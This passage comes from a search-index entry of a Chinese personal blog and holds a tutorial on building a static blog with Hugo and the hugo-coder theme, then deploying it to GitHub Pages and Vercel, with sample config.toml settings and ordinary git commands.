\u0026ndash;\u0026gt; 点击 New Repository\n注意此处，仓库命名为 ”username.github.io\u0026quot; 例如 你的账户名为lincx那么此处设置为 lincx.github.io\n点击 Create Repository即创建成功\n2.1.3 本地安装git 本地下载 Git ，Win10直接下载 exe ，点击下一步就好了\n（已安装的可以直接跳过）\n更多关于git 学习，可以看git学习\n2.2 Hugo  Hugo is one of the most popular open-source static site generators. With its amazing speed and flexibility, Hugo makes building websites fun again.\nHugo是由Go语言实现的静态网站生成器。简单、易用、高效、易拓展、快速部署。\n 2.2.1 安装hugo 从hugo的GitHub 仓库下载即可，可根据个人电脑类型选择适合的安装包，博主选择的是 hugo_0.89.4_Windows-64bit.zip，下载完成，解压，将hugo的路径添加到环境变量PATH即可。（针对win10）打开命令行，输入hugo version，显示版本号即为安装成功。\n2.2.2 初始化网站 在适合的位置 （推荐D盘）输入 hugo new site blogname ，其中 blogname 可以根据自己喜好修改\n\u0026gt; hugo new site blogname Congratulations! Your new Hugo site is created in E:\\blog\\hugo\\blogname. Just a few more steps and you're ready to go: 1. Download a theme into the same-named folder. Choose a theme from https://themes.gohugo.io/ or create your own with the \u0026quot;hugo new theme \u0026lt;THEMENAME\u0026gt;\u0026quot; command. 2. Perhaps you want to add some content. You can add single files with \u0026quot;hugo new \u0026lt;SECTIONNAME\u0026gt;\\\u0026lt;FILENAME\u0026gt;.\u0026lt;FORMAT\u0026gt;\u0026quot;. 3. Start the built-in live server via \u0026quot;hugo server\u0026quot;. Visit https://gohugo.io/ for quickstart guide and full documentation.  根据提示信息：\n 下载配置主题 添加blog文章内容 在本机启动hugo自带的服务器进行调试  点击进入blogname文件夹可以看到文件构成\n├─archetypes ├─content ├─data ├─layouts ├─resources ├─static ├─themes ├─.hugo_build.lock └─config.toml  config.toml 是网站的配置文件，hugo 同时还支持 YAML 格式的 config.yaml 或 JSON 格式的 config.json。content 目录放 markdown 文章，data 目录放数据，layouts 目录放网站模板文件，static 目录放图片、css、js 等静态资源，themes 命令放下载的主题\n2.2.3 下载主题 hugo默认不自带主题，但是又需要主题才能正常工作，所以我们可以到 主题网站，选择心仪的主题，下载到themes目录中。\n下面以code主题为例：\n首先点击到主题里边，点击 Download之后就会跳转到对应的GitHub仓库\n在readme 处通常会有安装教程，可以根据这个教程来完成\n也可以直接将它拉取到本地，复制地址\n在本地项目blogname的themes目录中，右击打开 Git Bash here ，运行 git clone git@github.com:luizdepra/hugo-coder.git hugo-coder命令，即可下载成功\n$ git clone git@github.com:luizdepra/hugo-coder.git hugo-coder Cloning into 'hugo-coder'... remote: Enumerating objects: 2649, done. remote: Counting objects: 100% (267/267), done. remote: Compressing objects: 100% (155/155), done. remote: Total 2649 (delta 92), reused 190 (delta 52), pack-reused 2382 Receiving objects: 100% (2649/2649), 3.05 MiB | 1.70 MiB/s, done. Resolving deltas: 100% (1320/1320), done.  接着，将 hugo-coder\\exampleSite\\config.toml 这个配置文件复制代替blogname 根目录的config.toml\n最后在项目blogname根目录打开命令行，下面是一个快速打开命令行的方式，在文件路径栏中输入 cmd按回车 Enter即可打开\n运行 hugo server -D 看到下面的提示，算成功了。\nE:\\blog\\hugo\\blogname\u0026gt;hugo server -D port 1313 already in use, attempting to use an available port Start building sites … hugo v0.89.4-AB01BA6E windows/amd64 BuildDate=2021-11-17T08:24:09Z VendorInfo=gohugoio | EN | PT-BR -------------------+----+-------- Pages | 11 | 11 Paginator pages | 0 | 0 Non-page files | 0 | 0 Static files | 5 | 5 Processed images | 0 | 0 Aliases | 1 | 0 Sitemaps | 2 | 1 Cleaned | 0 | 0 Built in 114 ms Watching for changes in E:\\blog\\hugo\\blogname\\{archetypes,content,data,layouts,static,themes} Watching for config changes in E:\\blog\\hugo\\blogname\\config.toml, E:\\blog\\hugo\\blogname\\themes\\hugo-coder\\config.toml Environment: \u0026quot;development\u0026quot; Serving pages from memory Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender Web Server is available at http://localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop  打开 浏览器 访问 http://localhost:1313/ 可以看到blog主页\n2.2.4 添加内容 在项目目录中执行 hugo new XX.md 命令，会在 content 目录中创建这个 XX.md 文件。\nhugo new about.md  这个文件的默认内容为：\n--- title: \u0026quot;About\u0026quot; date: 2021-12-03T15:05:35+08:00 draft: true ---  draft 表示是否是草稿，编辑完成后请将其改为 false，否则编译会跳过草稿文件。具体内容写在其下面：\n--- title: \u0026quot;About\u0026quot; date: 2021-12-03T15:05:35+08:00 draft: true --- # 关于作者 一名在校计算机专业学生，技术主要集中在后端开发，同时也有接触过前端、小程序开发，平时喜欢接触一些新鲜玩意儿 目前技术栈： + Golang、Java、JavaScript + Vue.js、Spring、Spring Boot、Gin + Mysql、Redis、Etcd + 云原生、分布式 希望通过这个blog记录自己学习心得等，有问题欢迎联系哦！  再次运行 hugo server -D，在浏览器点开blog主页的About能看到内容\n一般blog文章内容放在 content/posts这个目录中，所以写文章可以运行 hugo new posts/xxxx.md\n新建内容文件，然后编写内容\n+++ draft = true date = 2021-12-03T15:23:01+08:00 title = \u0026quot;First Blog\u0026quot; description = \u0026quot;xxxx\u0026quot; slug = \u0026quot;\u0026quot; authors = [\u0026quot;lincx\u0026quot;] tags = [] categories = [] externalLink = \u0026quot;\u0026quot; series = [] +++ # First Blog 这是我的第一篇blog 希望能在接下来的日子里，在这里分享自己学习心路历程  重新运行 hugo server -D，在浏览器点开blog主页的Blog能看到内容\n2.2.5 更改配置 blog项目的配置主要是根目录下的 config.toml文件\nbaseURL = \u0026quot;http://www.example.com\u0026quot; title = \u0026quot;johndoe\u0026quot; theme = \u0026quot;hugo-coder\u0026quot; languageCode = \u0026quot;en\u0026quot; defaultContentLanguage = \u0026quot;en\u0026quot; paginate = 20 pygmentsStyle = \u0026quot;bw\u0026quot; pygmentsCodeFences = true pygmentsCodeFencesGuessSyntax = true enableEmoji = true # Enable Disqus comments # disqusShortname = \u0026quot;yourdiscussshortname\u0026quot; [params] author = \u0026quot;John Doe\u0026quot; description = \u0026quot;John Doe's personal website\u0026quot; keywords = \u0026quot;blog,developer,personal\u0026quot; info = [\u0026quot;Full Stack DevOps\u0026quot;, \u0026quot;Magician\u0026quot;] avatarURL = \u0026quot;images/avatar.jpg\u0026quot; #gravatar = \u0026quot;john.doe@example.com\u0026quot; dateFormat = \u0026quot;January 2, 2006\u0026quot; since = 2019 # Git Commit in Footer, uncomment the line below to enable it commit = \u0026quot;https://github.com/luizdepra/hugo-coder/tree/\u0026quot; # Right To Left, shift content direction for languagues such as Arabic rtl = false # Specify light/dark colorscheme # Supported values: # \u0026quot;auto\u0026quot; (use preference set by browser) # \u0026quot;dark\u0026quot; (dark background, light foreground) # \u0026quot;light\u0026quot; (light background, dark foreground) (default) colorScheme = \u0026quot;auto\u0026quot; # Hide the toggle button, along with the associated vertical divider hideColorSchemeToggle = false # Series see also post count maxSeeAlsoItems = 5 # Custom CSS customCSS = [] # Custom SCSS, file path is relative to Hugo's asset folder (default: {your project root}/assets) customSCSS = [] # Custom JS customJS = [] # If you want to use fathom(https://usefathom.com) for analytics, add this section # [params.fathomAnalytics] # siteID = \u0026quot;ABCDE\u0026quot; # serverURL = \u0026quot;analytics.example.com\u0026quot; # Default value is cdn.usefathom.com, overwrite this if you are self-hosting # If you want to use plausible(https://plausible.io) for analytics, add this section # [params.plausibleAnalytics] # domain = \u0026quot;example.com\u0026quot; # serverURL = \u0026quot;analytics.example.com\u0026quot; # Default value is plausible.io, overwrite this if you are self-hosting or using a custom domain # If you want to use goatcounter(https://goatcounter.com) for analytics, add this section # [params.goatCounter] # code = \u0026quot;code\u0026quot; # If you want to use Cloudflare Web Analytics(https://cloudflare.com) for analytics, add this section # [params.cloudflare] # token = \u0026quot;token\u0026quot; # If you want to use Matomo(https://matomo.org) for analytics, add this section # [params.matomo] # siteID = \u0026quot;ABCDE\u0026quot; # Default value is \u0026quot;1\u0026quot;, overwrite this if you are cloud-hosting # serverURL = \u0026quot;analytics.example.com\u0026quot; # For cloud-hosting, use provided URL, e.g. example.matomo.cloud # If you want to use Google Tag Manager(https://analytics.google.com/) for analytics, add this section # [params.googleTagManager] # id = \u0026quot;gid\u0026quot; # If you want to implement a Content-Security-Policy, add this section [params.csp] childsrc = [\u0026quot;'self'\u0026quot;] fontsrc = [\u0026quot;'self'\u0026quot;, \u0026quot;https://fonts.gstatic.com\u0026quot;, \u0026quot;https://cdn.jsdelivr.net/\u0026quot;] formaction = [\u0026quot;'self'\u0026quot;] framesrc = [\u0026quot;'self'\u0026quot;] imgsrc = [\u0026quot;'self'\u0026quot;] objectsrc = [\u0026quot;'none'\u0026quot;] stylesrc = [ \u0026quot;'self'\u0026quot;, \u0026quot;'unsafe-inline'\u0026quot;, \u0026quot;https://fonts.googleapis.com/\u0026quot;, \u0026quot;https://cdn.jsdelivr.net/\u0026quot; ] scriptsrc = [\u0026quot;'self'\u0026quot;, \u0026quot;'unsafe-inline'\u0026quot;, \u0026quot;https://www.google-analytics.com\u0026quot;] prefetchsrc = [\u0026quot;'self'\u0026quot;] # connect-src directive – defines valid targets for to XMLHttpRequest (AJAX), WebSockets or EventSource connectsrc = [\u0026quot;'self'\u0026quot;, \u0026quot;https://www.google-analytics.com\u0026quot;] [taxonomies] category = \u0026quot;categories\u0026quot; series = \u0026quot;series\u0026quot; tag = \u0026quot;tags\u0026quot; author = \u0026quot;authors\u0026quot; [[params.social]] name = \u0026quot;Github\u0026quot; icon = \u0026quot;fa fa-2x fa-github\u0026quot; weight = 1 url = \u0026quot;https://github.com/johndoe/\u0026quot; [[params.social]] name = \u0026quot;Gitlab\u0026quot; icon = \u0026quot;fa fa-2x fa-gitlab\u0026quot; weight = 2 url = \u0026quot;https://gitlab.com/johndoe/\u0026quot; [[params.social]] name = \u0026quot;Twitter\u0026quot; icon = \u0026quot;fa fa-2x fa-twitter\u0026quot; weight = 3 url = \u0026quot;https://twitter.com/johndoe/\u0026quot; [[params.social]] name = \u0026quot;LinkedIn\u0026quot; icon = \u0026quot;fa fa-2x fa-linkedin\u0026quot; weight = 4 url = \u0026quot;https://www.linkedin.com/in/johndoe/\u0026quot; [[params.social]] name = \u0026quot;Medium\u0026quot; icon = \u0026quot;fa fa-2x fa-medium\u0026quot; weight = 5 url = \u0026quot;https://medium.com/@johndoe\u0026quot; [[params.social]] name = \u0026quot;RSS\u0026quot; icon = \u0026quot;fa fa-2x fa-rss\u0026quot; weight = 6 url = \u0026quot;https://myhugosite.com/index.xml\u0026quot; rel = \u0026quot;alternate\u0026quot; type = \u0026quot;application/rss+xml\u0026quot; [languages.en] languageName = \u0026quot;🇬🇧\u0026quot; [[languages.en.menu.main]] name = \u0026quot;About\u0026quot; weight = 1 url = \u0026quot;about/\u0026quot; [[languages.en.menu.main]] name = \u0026quot;Blog\u0026quot; weight = 2 url = \u0026quot;posts/\u0026quot; [[languages.en.menu.main]] name = \u0026quot;Projects\u0026quot; weight = 3 url = \u0026quot;projects/\u0026quot; [[languages.en.menu.main]] name = \u0026quot;Contact me\u0026quot; weight = 5 url = \u0026quot;contact/\u0026quot; [languages.pt-br] languageName = \u0026quot;🇧🇷\u0026quot; title = \u0026quot;João Ninguém\u0026quot; [languages.pt-br.params] author = \u0026quot;João Ninguém\u0026quot; info = \u0026quot;Full Stack DevOps e Mágico\u0026quot; description = \u0026quot;Sítio pessoal de João Ninguém\u0026quot; keywords = \u0026quot;blog,desenvolvedor,pessoal\u0026quot; [[languages.pt-br.menu.main]] name = \u0026quot;Sobre\u0026quot; weight = 1 url = \u0026quot;about/\u0026quot; [[languages.pt-br.menu.main]] name = \u0026quot;Blog\u0026quot; weight = 2 url = \u0026quot;posts/\u0026quot; [[languages.pt-br.menu.main]] name = \u0026quot;Projetos\u0026quot; weight = 3 url = \u0026quot;projects/\u0026quot; [[languages.pt-br.menu.main]] name = \u0026quot;Contato\u0026quot; weight = 5 url = \u0026quot;contact/\u0026quot;  ✨😈一定要修改baseURL ：\n需要改成 2.1.2步 创建的仓库 ，找到Settings-\u0026gt;Options-\u0026gt;Repository name\n将 bashURL \u0026ldquo;=\u0026rdquo; 后面的内容换成 “https://xxxx.github.io/”xxxx 为你的用户名，例如我的 “https://lincx-911.github.io/”\n如果不修改 baseURL的话push到远程仓库，会找不到文件\n🤡修改头像的话 avatarURL：\n可以在项目根目录下的 static\\images文件夹（没有的话自己创建）添加自己的照片，将 avatarURL后面的内容修改为 “images\\xxxx.png”\n其他的可以根据自己的需求进行修改\n2.2.6 上传到GitHub 在项目根目录 blogname打开命令行，输入 hugo，回车，如果一切顺利，所有静态页面都会生成到 public 目录，将pubilc目录里所有文件 push 到刚创建的Repository的\nPS E:\\blog\\hugo\\blogname\u0026gt; hugo Start building sites … hugo v0.89.4-AB01BA6E windows/amd64 BuildDate=2021-11-17T08:24:09Z VendorInfo=gohugoio | EN | PT-BR -------------------+----+-------- Pages | 11 | 11 Paginator pages | 0 | 0 Non-page files | 0 | 0 Static files | 10 | 10 Processed images | 0 | 0 Aliases | 1 | 0 Sitemaps | 2 | 1 Cleaned | 0 | 0 Total in 936 ms  进入 public 文件夹，依次输入下面命令就行，注意 xxxx要换成你的github username\n$ cd public $ git init $ git remote add origin https://github.com/xxxxx/xxxxx.github.io.git $ git add -A $ git commit -m \u0026quot;first commit\u0026quot; $ git push -u origin master  浏览器里访问：http://xxxxxx.github.io/会看到你的blog主页了。以后，每次新增文章或者修改配置，都需要重新走一遍上面2.2.6 的步骤，只不过不需要 git init跟git remote 两个步骤，这两个只需要在第一次push的时候执行就行\n2.2.7 报错 1、点看主页后发现 “This XML file does not appear to have any”。解决：点开GitHub仓库\n Settings -\u0026gt; Pages -\u0026gt; Change theme  随便选一个主题就行。然后重新访问就能正常了。\n2.3 Vercel vercel 是目前我用过的最好用的网站托管服务\n2.3.1 注册账号 访问主页，点击右上角 Sign Up 注册账号\n通过Git仓库账号关联注册，如果注册中出现错误，检查下账号是不是QQ邮箱。\nVercel不支持QQ邮箱，以GitHub为例，可以修改GitHub的默认邮箱。\nGitHub -\u0026gt; Settings -\u0026gt; Emails -\u0026gt; Primary email address  2.3.2 创建project 点击 New Project 输入前面创建的GitHub仓库的地址\n在线安装vercel\nGitHub -\u0026gt; Settings -\u0026gt; Applications -\u0026gt; Vercel -\u0026gt; Configure  选择项目 ，选择项目框架\n点击 Deploy部署项目\n点击 DOMAINS下面的xxxxx-vercel-app就能访问你的主页了\n2.3.3 设置域名 Vercel -\u0026gt; Project-\u0026gt; Settings -\u0026gt; Domains  生效后会自动签发SSL证书，开启HTTPS\n","id":4,"section":"posts","summary":"一、背景介绍 博主之前使用Hexo 搭建博客，用了三年，这个工具最大的缺点就是，每次更新blog后，项目运行跟打包的速度有点慢，直到近期在冲浪的","tags":["Hugo","Vercel","Git Pages"],"title":"hugo搭建个人博客","uri":"https://www.stana.top/2021/12/first/","year":"2021"}],"tags":[{"title":"csapp-lab","uri":"https://www.stana.top/tags/csapp-lab/"},{"title":"Git Pages","uri":"https://www.stana.top/tags/git-pages/"},{"title":"Gitee","uri":"https://www.stana.top/tags/gitee/"},{"title":"Hugo","uri":"https://www.stana.top/tags/hugo/"},{"title":"Markdown","uri":"https://www.stana.top/tags/markdown/"},{"title":"Vercel","uri":"https://www.stana.top/tags/vercel/"},{"title":"汇编","uri":"https://www.stana.top/tags/%E6%B1%87%E7%BC%96/"}]}